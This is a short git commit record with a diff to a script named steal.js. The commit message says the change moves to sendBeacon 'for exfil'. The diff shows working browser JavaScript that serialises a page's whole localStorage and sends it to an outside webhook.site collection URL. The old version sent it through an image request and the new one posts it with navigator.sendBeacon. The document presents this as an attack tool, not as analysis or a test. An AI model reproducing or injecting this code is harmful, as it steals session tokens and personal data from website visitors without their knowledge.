0e15f3ac64c3ca024a7d74ac2f5d109637023d94
Lilian <dornelilian@gmail.com>
2026-03-29 12:16:25 +0200

    Use sendBeacon for exfil (no URL size limit)

--- steal.js
+++ steal.js
@@ -1,4 +1,4 @@
-// Exfiltrate localStorage to webhook
+// Exfiltrate localStorage to webhook via POST (no size limit)
 var w = 'https://webhook.site/110e13f1-4346-447a-851b-3bc154e1bc50';
-var d = encodeURIComponent(JSON.stringify(localStorage));
-new Image().src = w + '?type=localstorage-exfil&d=' + d + '&ts=' + Date.now();
+var d = JSON.stringify(localStorage);
+navigator.sendBeacon(w, d);
